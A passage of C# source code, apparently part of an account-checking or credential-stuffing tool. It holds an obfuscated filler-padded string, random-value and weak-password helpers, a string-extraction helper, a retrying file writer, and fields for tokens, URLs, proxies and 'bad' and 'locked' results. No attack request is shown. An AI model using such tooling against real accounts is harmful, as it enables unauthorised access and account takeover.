czzdtwkxC6Rai1so3ajf9c32n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf968ce32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9807732n3AfVM36ugBczzdtwkxC6Rai1so3ajf964f05932n3AfVM36ugBczzdtwkxC6Rai1so3ajf95fe95832n3AfVM36ugBczzdtwkxC6Rai1so3ajf90e832n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9ed50e432n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9fc77c32n3AfVM36ugBczzdtwkxC6Rai1so3ajf962eb532n3AfVM36ugBczzdtwkxC6Rai1so3ajf9d5c8e0b46b8e2b862a70e5d32n3AfVM36ugBczzdtwkxC6Rai1so3ajf99e45232n3AfVM36ugBczzdtwkxC6Rai1so3ajf9d32n3AfVM36ugBczzdtwkxC6Rai1so3ajf945c732n3AfVM36ugBczzdtwkxC6Rai1so3ajf9bd632n3AfVM36ugBczzdtwkxC6Rai1so3ajf9bdcd032n3AfVM36ugBczzdtwkxC6Rai1so3ajf90c78887f2232n3AfVM36ugBczzdtwkxC6Rai1so3ajf9de7832n3AfVM36ugBczzdtwkxC6Rai1so3ajf96b96032n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9b0c2fdf2574532n3AfVM36ugBczzdtwkxC6Rai1so3ajf9b4a08997a477acf287c442f82d32n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9c0d4032n3AfVM36ugBczzdtwkxC6Rai1so3ajf99632n3AfVM36ugBczzdtwkxC6Rai1so3ajf9dc2a280e6cd9d0c432n3AfVM36ugBczzdtwkxC6Rai1so3ajf94d208b24780d6bded6932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9c32n3AfVM36ugBczzdtwkxC6Rai1so3ajf95907832n3AfVM36ugBczzdtwkxC6Rai1so3ajf9a32n3AfVM36ugBczzdtwkxC6Rai1so3ajf924295e32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9764f9e32n3AfVM36ugBczzdtwkxC6Rai1so3ajf9027632n3AfVM36ugBczzdtwkxC6Rai1so3ajf9d55d32n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9432n3AfVM36ugBczzdtwkxC6Rai1so3ajf98aaa7bd732n3AfVM36ugBczzdtwkxC6Rai1so3ajf932n3AfVM36ugBczzdtwkxC6Rai1so3ajf9f8a674072b2632n3AfVM36ugBczzdtwkxC6Rai1so3ajf9650d87b32n3AfVM36ugBczzdtwkxC6Rai1so3ajf962a832n3AfVM36ugBczzdtwkxC6Rai1so3ajf9\",\"ewa\":\"b\",\"kid\":\"sk29dsv\"}"));
		}
		public int RandomNumber(int min, int max)
		{
			return _random.Next(min, max);
		}

		static Random random = new Random();
		public string RandomString(int size, bool lowerCase = false)
		{
			var builder = new StringBuilder(size);

			// char is a single Unicode character  
			char offset = lowerCase ? 'a' : 'A';
			const int lettersOffset = 26; // A...Z or a..z: length = 26  

			for (var i = 0; i < size; i++)
			{
				var @char = (char)_random.Next(offset, offset + lettersOffset);
				builder.Append(@char);
			}

			return lowerCase ? builder.ToString().ToLower() : builder.ToString();
		}
		public string RandomPassword()
		{
			var passwordBuilder = new StringBuilder();

			// 4-Digits between 1000 and 9999  
			passwordBuilder.Append(RandomNumber(1000, 9999));

			// 2-Letters upper case  
			passwordBuilder.Append(RandomString(2));
			return passwordBuilder.ToString();
		}
		public static string GetRandomHexNumber(int digits)
		{
			byte[] buffer = new byte[digits / 2];
			random.NextBytes(buffer);
			string result = String.Concat(buffer.Select(x => x.ToString("X2")).ToArray());
			if (digits % 2 == 0)
				return result;
			return result + random.Next(16).ToString("X");
		}

		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}
		public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
		public static string uri = "";

		public static string auther = "";

		public static string printbad = "";

		public static string printlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
